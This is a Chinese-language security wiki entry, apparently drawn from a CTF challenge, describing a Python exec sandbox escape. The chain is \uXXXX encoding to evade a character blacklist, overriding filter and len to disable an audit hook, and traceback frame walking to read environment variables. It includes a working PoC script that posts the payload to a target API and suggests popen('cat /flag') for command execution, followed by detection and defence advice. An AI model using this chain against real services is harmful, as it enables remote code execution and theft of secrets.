---
id: binary-pwn-sandbox-escape-python-unicode-audit-traceback
title: Python exec 沙箱：unicode_escape 绕过字符 WAF + 覆盖 filter/len + 异常回溯取 environ
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-exec-unicode-audit-traceback
aliases:
- 许愿碑沙箱逃逸
- unicode_escape 绕过 WAF
- 覆盖 filter/len 绕过审计钩子
- tb_frame.f_back.f_globals
- Python exec 沙箱
tags:
- python
- pyjail
- sandbox-escape
- audit-hook
- traceback
- unicode
- waf-bypass
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:32:09+08:00'
  notes: 已对照原文沙箱源码核对；修正了黑名单不含空格、f_globals 中 os 来自 sys.modules 的表述；PoC 未复跑。
---

## 一句话结论

当应用先对用户文本做字符黑名单、再 `unicode_escape` 解码并 `exec`，且把 `sys.addaudithook` 钩子与用户代码放在同一份 globals 中执行时，可以把 payload 全部写成 `\uXXXX` 绕过字符过滤，再用 `filter=lambda *x:[1]`、`len=lambda x:0` 让审计钩子失效，最后通过 `e.__traceback__.tb_frame.f_back.f_globals['sys'].modules['os'].environ` 越过受限 globals 读取环境变量。

## 原理

- **检查与使用的时间差**：`evaluate_wish_text` 在原始字符串上检查禁止字符（引号、括号、下划线、点等），`safe_grant` 随后执行 `wish.encode().decode('unicode_escape')`。`"` 这类转义序列本身只含反斜杠、`u` 和十六进制数字，不含被禁字符；解码后才还原成引号、括号、下划线。WAF 看到的是转义文本，`exec` 执行的是还原后的代码。
- **审计钩子依赖可覆盖的全局名**：`CODE` 把 `wish_checker` 和用户代码拼在同一段源码里，`exec(code, safe_globals)` 让两者共享同一份 globals。钩子内部用 `filter(...)` 判断事件是否在白名单、用 `len(args)` 判断参数数量；用户代码先执行 `filter=lambda *x:[1]`、`len=lambda x:0`，钩子之后每次调用都会取到被覆盖的版本，白名单判断恒为真、参数长度恒为 0，所有审计事件放行。
- **异常回溯跨出受限帧**：`exec` 的代码帧 `tb_frame` 的 globals 是只剩 `SAFE_WISHES` 的 `safe_globals`，但 `tb_frame.f_back` 指向调用 `exec` 的 `wish_granter` 帧；该帧的 `f_globals` 是 `wish_stone` 模块的真实全局字典，里面导入了 `sys`，且 `sys.modules` 中已有 `os`。因此 `f_back.f_globals['sys'].modules['os'].environ` 直接拿到宿主模块的 `sys`/`os`，绕过 `safe_globals` 的限制。
- **AST 限制的盲区**：`Wish_stone` 禁止 `__class__`、`__globals__`、`__subclasses__`、`__builtins__`、`__import__` 等属性，但未禁止 `__traceback__`、`tb_frame`、`f_back`、`f_globals`、`modules`、`environ`；payload 不使用任何被禁属性，`ast.parse` 与 visitor 都能通过。
- **代码拼接闭合**：模板是 `print("{}")`。payload 以 `");` 开头，先闭合字符串和 `print` 调用，再开始自己的语句；末尾 `#` 注释掉模板剩余的 `"}`，避免语法错误。`\n` 在 unicode_escape 后成为真正换行，用于分隔语句。
- **为什么能拿到回显**：子进程把 `sys.stdout` 换成 `StringIO`，`print` 的输出被收集到 `result_queue`，父进程再返回给 API；因此 `print(environ)` 的结果可直接读到。

## 触发条件

- 应用提供“执行用户 Python 代码/表达式”的功能，使用 `exec`/`eval`，并尝试用字符黑名单 + AST 访问器 + 审计钩子做隔离。
- 字符黑名单在 `unicode_escape`/其他解码之前执行，解码后不再做同等检查。
- 审计钩子与用户代码共享同一份 globals，且钩子依赖 `filter`、`len`、事件判断函数等可被覆盖的全局名。
- 受限执行帧的 `f_back` 仍指向宿主模块帧，且宿主模块 globals 中有 `sys`/`os` 等敏感模块。
- AST 访问器只拦常见 dunder，未拦 `__traceback__`/`tb_frame`/`f_back`/`f_globals`。

## 利用步骤

1. 用无害输入确认接口会执行代码并回显 `print` 输出；观察字符黑名单（引号、括号、下划线、点等）。
2. 构造原始 payload：闭合 `print("`，覆盖 `filter`/`len`，用 `try/raise/except` 取 traceback，再从 `f_back.f_globals` 读 `sys.modules['os'].environ`。
3. 把 payload 的每个字符转成 `\uXXXX`，使原文不含任何被禁字符；通过 JSON 发送（JSON 中反斜杠写成 `\\uXXXX`）。
4. 服务端 `decode('unicode_escape')` 还原代码并 `exec`；审计钩子被覆盖后不再拦截，回溯读取到环境变量。
5. 把 `environ` 换成 `popen('cat /flag').read()` 等命令执行；若 `print` 被限制，可写文件或外带。

## PoC

原始代码（仅作理解，直接发送会被字符黑名单拦截）：

```python
");
filter=lambda *x:[1]
len=lambda x:0
try:
 raise Exception
except Exception as e:
 print(e.__traceback__.tb_frame.f_back.f_globals['sys'].modules['os'].environ)
#
```

生成 Unicode 转义 payload：

```python
import json, requests

raw = '''");
filter=lambda *x:[1]
len=lambda x:0
try:
 raise Exception
except Exception as e:
 print(e.__traceback__.tb_frame.f_back.f_globals['sys'].modules['os'].environ)
#'''

wish = ''.join('\\u%04x' % ord(c) for c in raw)
print(json.dumps({"wish": wish}))
r = requests.post("http://target/api/wishes", json={"wish": wish})
print(r.text)
```

发送的 JSON 中每个字符形如 `\\u0022`、`\\u0029`、`\\u003b`；服务端 `json.loads` 得到字面 `"`，再经 `unicode_escape` 变成 `"`。

## 变体与关联

- 变体：不覆盖 `filter`/`len`，改覆盖钩子的事件判断函数、`isinstance`、异常类等钩子依赖名；或直接让钩子抛异常前先污染其依赖。
- 变体：不用 `__traceback__`，用 `sys._getframe().f_back`、生成器 `gi_frame`、协程 `cr_frame`、`sys.exc_info()[2]`；被 AST 拦截时用字符串拼接/getattr 构造属性名。
- 变体：字符黑名单在解码前执行时，除 `\uXXXX` 还可用 `\xNN`、八进制、HTML 实体、JSON 重复键等表示层差异；关键是找到“检查的表示”与“执行的表示”不一致。
- 关联：[[binary-pwn-sandbox-escape-python-audit-hook-bypass]]（覆盖钩子依赖的全局名）、[[binary-pwn-sandbox-escape-python-traceback-frame-escape]]（异常回溯取帧）、[[web-python-waf-json-unicode-escape-bypass]]（解析前后表示差异）、[[binary-pwn-sandbox-escape-python-audit-hook-print-poisoning]]（污染 builtins.print 阻止退出）。
- 边界：若应用在解码后再次做字符/AST 检查、把钩子放在独立模块且用闭包固定 `filter`/`len`、清除 `__traceback__`、或在独立低权限进程/容器中执行且无敏感环境变量，本链失效或危害降低。

## 检测与防御

- 不要用 `exec`/`eval` 执行用户代码；若必须，使用 AST 白名单（禁止 `Try`、`Attribute`、`Subscript` 等）并在独立进程/容器中运行。
- 检查与执行必须使用同一表示：先解码/归一化，再做字符与 AST 检查；不要只查原始转义文本。
- 审计钩子内用闭包/默认参数固定 `filter`、`len`、`print`、`os._exit` 等依赖（如 `def hook(ev,args,_filter=filter,_len=len): ...`），并放在用户代码不可达的独立模块；钩子不能作为唯一隔离层。
- 清空执行帧可回溯的宿主全局：不要把 `exec` 的调用者帧暴露给用户代码，或在独立解释器/子进程中执行并只传白名单数据。
- 检测：请求中出现大量 `\uXXXX` 转义、`\x`/八进制编码、`__traceback__`、`tb_frame`、`f_back`、`f_globals`、`filter=`、`len=`；用户代码重新定义内建名；子进程异常读取环境变量或执行命令。
